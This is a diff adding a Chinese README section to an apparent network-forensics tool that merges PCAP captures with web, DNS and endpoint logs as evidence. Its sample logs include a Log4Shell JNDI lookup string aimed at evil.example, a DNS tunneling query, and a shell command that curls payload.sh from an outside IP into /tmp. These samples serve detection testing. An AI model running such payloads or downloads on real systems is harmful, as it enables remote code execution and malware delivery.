@@ -451,3 +451,102 @@ unsupported_claims
 ```
 
 作用：验证 LLM 只生成结构化摘要，并且所有 supported claim 都必须引用有效的 `evidence_id`。
+
+## 14. 多源证据融合：PCAP + 日志
+
+FlowTragent 现在支持在 PCAP 分析时额外合并 Web access log、DNS log、endpoint/process log。
+
+### 14.1 Web access log
+
+支持常见 Nginx/Apache combined log，也支持 JSONL/CSV。
+
+```bash
+python main.py \
+  --mode pcap \
+  --input data/pcap/demo_attack.pcap \
+  --demo-index \
+  --access-log logs/access.log
+```
+
+常见 combined log 示例：
+
+```text
+10.10.10.5 - - [27/Jun/2026:06:40:00 +0000] "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1" 200 2 "-" "curl/8.0"
+```
+
+### 14.2 DNS log
+
+支持 JSONL/CSV。推荐字段：
+
+```text
+timestamp,src_ip,dst_ip,query,qtype
+```
+
+JSONL 示例：
+
+```json
+{"timestamp":"2026-06-27T06:40:30Z","src_ip":"10.10.10.20","dst_ip":"8.8.8.8","query":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example","qtype":"TXT"}
+```
+
+运行：
+
+```bash
+python main.py \
+  --mode pcap \
+  --input data/pcap/demo_attack.pcap \
+  --demo-index \
+  --dns-log logs/dns.jsonl
+```
+
+### 14.3 Endpoint / process log
+
+支持 JSONL/CSV。推荐字段：
+
+```text
+timestamp,host,process_name,command_line,dst_ip,dst_port
+```
+
+CSV 示例：
+
+```csv
+timestamp,host,process_name,command_line,dst_ip,dst_port
+2026-06-27T06:41:00Z,10.10.10.20,bash,"bash -c whoami; curl http://203.0.113.50/payload.sh -o /tmp/payload.sh",203.0.113.50,8080
+```
+
+运行：
+
+```bash
+python main.py \
+  --mode pcap \
+  --input data/pcap/demo_attack.pcap \
+  --demo-index \
+  --endpoint-log logs/endpoint.csv
+```
+
+### 14.4 多日志同时输入
+
+```bash
+python main.py \
+  --mode pcap \
+  --input data/pcap/demo_attack.pcap \
+  --demo-index \
+  --enable-rag \
+  --access-log logs/access.log \
+  --dns-log logs/dns.jsonl \
+  --endpoint-log logs/endpoint.csv
+```
+
+作用：
+
+- PCAP 负责还原网络流量和 CVE 候选召回。
+- Access log 用于补充 HTTP 状态码、URI、User-Agent 和入口证据。
+- DNS log 用于补充 DNS C2 / tunneling 证据。
+- Endpoint log 用于确认命令执行、payload 下载、落地文件和外联进程。
+- Agent Evidence Pack 会统一记录 packet/log 证据 ID，例如 `pkt-1`、`access1-1`、`dnslog1-1`、`endpoint1-1`。
+
+验证命令：
+
+```bash
+python tests/test_log_parser.py
+python tests/test_multisource_pipeline.py
+```
